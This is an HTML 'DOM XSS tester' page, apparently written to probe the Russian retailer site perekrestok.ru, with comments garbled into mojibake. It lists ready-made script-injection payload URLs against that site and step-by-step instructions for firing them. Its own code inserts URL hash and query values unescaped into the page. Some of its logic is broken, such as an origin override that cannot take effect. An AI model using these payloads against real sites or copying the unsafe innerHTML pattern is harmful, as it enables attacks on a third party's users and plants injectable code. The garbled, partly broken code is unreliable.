<!DOCTYPE html>
<html>
<head>
    <title>AKUMA DOM XSS Test</title>
</head>
<body>
    <h1>üî• AKUMA DOM XSS Tester üî•</h1>
    <div id="results"></div>

    <script>
        // –¢–µ—Å—Ç 1: –ü—Ä—è–º–∞—è –º–∞–Ω–∏–ø—É–ª—è—Ü–∏—è origin
        console.log("üîç –¢–µ—Å—Ç 1: –ú–∞–Ω–∏–ø—É–ª—è—Ü–∏—è window.location.origin");
        
        try {
            // –ü–æ–ø—ã—Ç–∫–∞ –ø–µ—Ä–µ–æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å origin (–∫–∞–∫ –≤ –∫–æ–¥–µ Perekrestok)
            Object.defineProperty(window.location, 'origin', {
                value: 'javascript:alert("AKUMA_DOM_XSS")//',
                writable: true,
                configurable: true
            });
            
            // –≠–º—É–ª—è—Ü–∏—è –∫–æ–¥–∞ —Å Perekrestok
            const origin = window.location.protocol + "//" + window.location.host;
            document.getElementById('ORIGIN-ID').innerHTML = "Origin: " + origin;
            
            console.log("‚úÖ Origin pollution test passed");
        } catch (e) {
            console.log("‚ùå Origin pollution failed:", e);
        }

        // –¢–µ—Å—Ç 2: Hash-based XSS
        console.log("üîç –¢–µ—Å—Ç 2: Hash-based DOM XSS");
        
        if (location.hash) {
            const hashValue = decodeURIComponent(location.hash.substring(1));
            console.log("Hash value:", hashValue);
            
            // –û–ø–∞—Å–Ω–∞—è –ø—Ä–∞–∫—Ç–∏–∫–∞ - –ø—Ä—è–º–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ hash –≤ innerHTML
            if (hashValue.includes('<script>') || hashValue.includes('javascript:')) {
                console.log("üö® –ü–û–¢–ï–ù–¶–ò–ê–õ–¨–ù–´–ô DOM XSS –ù–ê–ô–î–ï–ù!");
                document.getElementById('results').innerHTML = 
                    '<div style="color: red; font-weight: bold;">‚ö†Ô∏è DOM XSS VECTOR DETECTED: ' + hashValue + '</div>';
            }
        }

        // –¢–µ—Å—Ç 3: URL –ø–∞—Ä–∞–º–µ—Ç—Ä—ã
        console.log("üîç –¢–µ—Å—Ç 3: URL –ø–∞—Ä–∞–º–µ—Ç—Ä—ã DOM XSS");
        
        const urlParams = new URLSearchParams(window.location.search);
        for (const [key, value] of urlParams) {
            console.log(`Param ${key}: ${value}`);
            
            if (value.includes('<') || value.includes('javascript:') || value.includes('data:')) {
                console.log("üö® –ü–û–¢–ï–ù–¶–ò–ê–õ–¨–ù–ê–Ø –£–Ø–ó–í–ò–ú–û–°–¢–¨ –í –ü–ê–†–ê–ú–ï–¢–†–ï:", key, "=", value);
                document.getElementById('results').innerHTML += 
                    '<div style="color: orange;">‚ö†Ô∏è Suspicious param: ' + key + ' = ' + value + '</div>';
            }
        }

        // –†–µ–∑—É–ª—å—Ç–∞—Ç—ã
        document.getElementById('results').innerHTML += 
            '<div style="margin-top: 20px; padding: 10px; border: 2px solid #ccc;">' +
            '<h3>üîç –¢–µ—Å—Ç–æ–≤—ã–µ URL –¥–ª—è Perekrestok:</h3>' +
            '<p><strong>1. Hash-based:</strong><br>' +
            '<code>https://www.perekrestok.ru/status#&lt;script&gt;alert("AKUMA")&lt;/script&gt;</code></p>' +
            
            '<p><strong>2. Data URL:</strong><br>' +
            '<code>https://www.perekrestok.ru/status#data:text/html,&lt;script&gt;alert("AKUMA")&lt;/script&gt;</code></p>' +
            
            '<p><strong>3. Javascript URL:</strong><br>' +
            '<code>https://www.perekrestok.ru/status#javascript:alert("AKUMA")</code></p>' +
            
            '<h3>üéØ –ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:</h3>' +
            '<ol>' +
            '<li>–û—Ç–∫—Ä–æ–π –ª—é–±–æ–π –∏–∑ URL –≤—ã—à–µ –≤ –±—Ä–∞—É–∑–µ—Ä–µ</li>' +
            '<li>–û—Ç–∫—Ä–æ–π Developer Tools (F12)</li>' +
            '<li>–°–º–æ—Ç—Ä–∏ –Ω–∞ –∫–æ–Ω—Å–æ–ª—å –∏ DOM</li>' +
            '<li>–ï—Å–ª–∏ –≤–∏–¥–∏—à—å alert –∏–ª–∏ –∫–æ–¥ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è - BINGO!</li>' +
            '</ol>' +
            
            '<p style="color: red; font-weight: bold;">‚ö†Ô∏è –í–ê–ñ–ù–û: –¢–µ—Å—Ç–∏—Ä—É–π —Ç–æ–ª—å–∫–æ –Ω–∞ —Å–≤–æ–∏—Ö —Å–∞–π—Ç–∞—Ö –∏–ª–∏ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ–º!</p>' +
            '</div>';

        console.log("üèÅ –¢–µ—Å—Ç—ã –∑–∞–≤–µ—Ä—à–µ–Ω—ã. –ü—Ä–æ–≤–µ—Ä—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –≤—ã—à–µ!");
    </script>

    <div id="ORIGIN-ID" style="margin-top: 20px; padding: 10px; background: #f0f0f0;">
        <!-- –°—é–¥–∞ –±—É–¥–µ—Ç –∑–∞–ø–∏—Å–∞–Ω origin (–∫–∞–∫ –Ω–∞ Perekrestok) -->
    </div>
</body>
</html>
